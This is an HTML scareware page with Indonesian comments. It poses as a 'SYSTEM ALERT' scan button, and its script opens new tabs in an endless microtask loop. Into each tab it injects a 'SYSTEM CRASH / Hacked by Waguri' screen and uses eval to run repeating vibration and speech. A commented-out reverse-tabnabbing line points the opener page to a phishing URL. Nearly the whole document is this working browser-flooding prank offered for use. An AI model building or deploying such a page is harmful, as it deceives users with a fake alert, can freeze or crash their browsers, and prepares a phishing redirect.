<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Cross-Tab DOM Injection</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 500px; text-align: center; border: 1px solid #333; }
h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
button { width: 100%; padding: 18px; cursor: pointer; border: none; border-radius: 8px; background: #d32f2f; color: #fff; font-weight: bold; font-size: 18px; box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4); transition: background 0.2s; }
button:hover { background: #b71c1c; }
button:disabled { background: #555; cursor: not-allowed; }
#status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; }
</style>
</head>

<body>
<div class="panel" id="main-panel">
    <h1>⚠️ SYSTEM ALERT</h1>
    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Cross-Tab DOM Injection).</p>
    
    <button id="start-btn" type="button">Mulai Pemindaian</button>
    
    <div id="status" role="status">Menunggu interaksi...</div>
</div>

<script>
const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");

let isProcessing = false;

function efekHacker() {
    if (navigator.vibrate) {
        navigator.vibrate([1000, 200, 1000, 200, 1000]);
    }
    if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
        const utterance = new SpeechSynthesisUtterance('Hacked by Waguri');
        utterance.lang = 'en-US';
        utterance.rate = 0.9;
        window.speechSynthesis.speak(utterance);
    }
}

startBtn.addEventListener("click", function() {
    if (isProcessing) return;
    isProcessing = true;
    startBtn.disabled = true;
    startBtn.textContent = "Sistem Terkunci...";

    efekHacker();

    let dipicu = 0;
    statusDiv.textContent = "Memicu Cross-Tab DOM Injection...";

    function picuTerusMenerus() {
        dipicu++;
        try {
            // 1. Buka tab kosong
            const w = window.open('about:blank', '_blank');
            
            if (w) {
                try {
                    // 2. SUNTIKKAN ELEMEN HTML LANGSUNG DARI HALAMAN UTAMA
                    // Karena about:blank mewarisi origin, kita bisa akses w.document
                    
                    // Buat elemen style
                    const style = w.document.createElement('style');
                    style.textContent = `
                        body { margin:0; padding:0; background:#000; color:#f00; display:flex; align-items:center; justify-content:center; height:100vh; font-family:monospace; text-align:center; overflow:hidden; }
                        h1 { font-size:60px; text-shadow:0 0 20px #f00; animation: pulse 0.5s infinite; }
                        p { color:#0f0; font-size:20px; }
                        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
                    `;
                    w.document.head.appendChild(style);

                    // Buat elemen div container
                    const container = w.document.createElement('div');
                    
                    // Buat elemen h1
                    const h1 = w.document.createElement('h1');
                    h1.textContent = "SYSTEM CRASH";
                    
                    // Buat elemen p
                    const p = w.document.createElement('p');
                    p.textContent = "Hacked by Waguri";
                    
                    // Gabungkan
                    container.appendChild(h1);
                    container.appendChild(p);
                    w.document.body.appendChild(container);

                    // --- REVERSE TABNABBING ---
                    // (Opsional) Belokkan halaman utama ke situs lain
                    try {
                        if (w.opener) {
                            // w.opener.location.href = 'https://example.com/phishing';
                        }
                    } catch(e) {}

                    // --- GETAR & TTS DI TAB BARU ---
                    // Karena kita punya akses ke w, kita bisa mengeksekusi script di sana
                    w.eval(`
                        if (navigator.vibrate) {
                            setInterval(function() {
                                navigator.vibrate([2000, 500, 2000]);
                            }, 3000);
                        }
                        if ('speechSynthesis' in window) {
                            setInterval(function() {
                                var msg = new SpeechSynthesisUtterance('System compromised');
                                msg.lang = 'en-US';
                                window.speechSynthesis.speak(msg);
                            }, 4000);
                        }
                    `);

                } catch(e) {
                    console.warn("Injeksi lintas tab diblokir: " + e.message);
                }
            }
            statusDiv.textContent = `Membuka tab injeksi ke-${dipicu}...`;
        } catch(e) {}

        // Panggil dirinya sendiri via Microtask
        queueMicrotask(picuTerusMenerus);
    }

    // Mulai Looping
    queueMicrotask(function() {
        queueMicrotask(function() {
            picuTerusMenerus();
        });
    });
});
</script>
</body>
</html>
